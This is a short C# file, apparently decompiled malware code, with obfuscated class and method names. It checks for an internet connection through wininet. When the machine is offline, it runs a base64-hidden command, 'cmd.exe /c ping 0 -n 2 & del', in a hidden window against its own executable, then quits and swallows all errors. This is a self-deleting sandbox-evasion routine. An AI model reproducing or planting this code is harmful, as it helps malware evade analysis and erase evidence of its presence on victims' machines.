using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using A;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns3;

public class GClass3
{
	private const long long_0 = 2L;

	private const long long_1 = 1L;

	private const long long_2 = 4L;

	private const long long_3 = 32L;

	private const long long_4 = 64L;

	private const long long_5 = 16L;

	[DllImport("wininet", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long InternetGetConnectedState(ref long long_6, long long_7);

	private static bool A(ref string string_0 = "")
	{
		bool flag;
		bool result;
		long long_ = default(long);
		if ((flag = (result = (ulong)InternetGetConnectedState(ref long_, 0L) > 0uL)) == (ulong)(long_ & 2L) > 0uL)
		{
			string_0 = "LAN";
		}
		else if (flag == (ulong)(long_ & 1L) > 0uL)
		{
			string_0 = "Modem";
		}
		else if (flag == (ulong)(long_ & 4L) > 0uL)
		{
			string_0 = "Proxy";
		}
		else if (flag == (ulong)(long_ & 0x20L) > 0uL)
		{
			string_0 = "Offline";
		}
		else if (flag == (ulong)(long_ & 0x40L) > 0uL)
		{
			string_0 = "Configured";
		}
		else if (flag == (ulong)(long_ & 0x10L) > 0uL)
		{
			string_0 = "Remote";
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		try
		{
			string string_ = "";
			if (!A(ref string_))
			{
				Interaction.Shell(C.A(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) + "\"" + Application.get_ExecutablePath() + "\"", (AppWinStyle)0, false, -1);
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
